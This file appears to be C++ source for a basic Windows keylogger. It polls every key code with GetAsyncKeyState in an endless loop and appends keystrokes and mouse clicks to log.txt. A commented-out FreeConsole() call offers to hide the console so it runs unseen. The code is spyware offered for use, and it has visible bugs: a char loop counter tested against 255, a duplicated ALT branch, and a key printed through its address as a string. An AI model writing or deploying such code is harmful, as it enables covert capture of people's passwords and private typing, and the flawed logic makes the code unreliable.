#include <iostream>
#include <windows.h>
using namespace std;
void log(int key, char *fileName)
{
    FILE *f;
    f = fopen(fileName, "a+");
    if (key == VK_SHIFT)
    {
        fprintf(f, "%s", " SHIFT ");
    }
    else if (key == VK_LBUTTON)
    {
        fprintf(f, "%s", " LEFT_MOUSE_CLICK ");
    }
    else if (key == VK_RBUTTON)
    {
        fprintf(f, "%s", " RIGHT_MOUSE_CLICK ");
    }

    else if (key == VK_BACK)
    {
        fprintf(f, "%s", " BACKSPACE ");
    }
    else if (key == VK_CAPITAL)
    {
        fprintf(f, "%s", " CAPSLOCK ");
    }
    else if (key == VK_CONTROL)
    {
        fprintf(f, "%s", " CONTROL ");
    }
    else if (key == VK_MENU)
    {
        fprintf(f, "%s", " ALT ");
    }
    else if (key == VK_MENU)
    {
        fprintf(f, "%s", " ALT ");
    }
    else if (key == VK_RETURN)
    {
        fprintf(f, "%s", " ENTER ");
    }
    else if (key == VK_SPACE)
    {
        fprintf(f, "%s", " SPACEBAR ");
    }
    else if (key == VK_ESCAPE)
    {
        fprintf(f, "%s", " ESCAPE ");
    }
    else
    {

        fprintf(f, "%s", &key);
    }
        fclose(f);
}
int main()
{
// comment next line to show console while running
//    FreeConsole();
    char filename[10]="log.txt";
    FILE*f;
    f = fopen(filename, "a+");
    fprintf(f, "%s", "\n\nNEW\n\n");
    char i;
    while (1)
    {
        for (i = 0; i <= 255; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                log(i, filename);
            }
        }
    }
    return 0;
}
